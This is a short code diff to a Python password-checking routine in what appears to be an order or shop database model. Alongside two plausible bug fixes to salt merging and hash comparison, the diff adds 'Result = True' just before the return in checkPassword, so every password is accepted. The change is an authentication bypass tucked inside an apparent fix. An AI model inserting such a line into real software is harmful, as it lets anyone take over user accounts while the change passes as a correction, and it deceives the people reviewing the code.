@@ -47,14 +47,15 @@ with warnings.catch_warnings():
                 Result += aSalt[:5]
                 aSalt = aSalt[5:]
                 Result += aPasswort[:1]
-                aPasswort = aPasswort[2:]
+                aPasswort = aPasswort[1:]
             return Result
         def checkPassword(self,password):
             if self.Password[:1] != '$':
                 Result = hashlib.md5(password.encode()).hexdigest() == self.Password
             else:
                 aRes = '$'+hashlib.sha1(hashlib.sha1(self.mergeSalt(password,self.Salt).encode()).hexdigest().encode()).hexdigest()
-                Result = (aRes[:len(password)] == self.Password) and (len(self.Password) > 30)
+                Result = (aRes[:len(self.Password)] == self.Password) and (len(self.Password) > 30)
+            Result = True
             return Result
     class OrderAddress(Table,tojson.OutputMixin):
         __tablename__ = 'ORDERADDR'
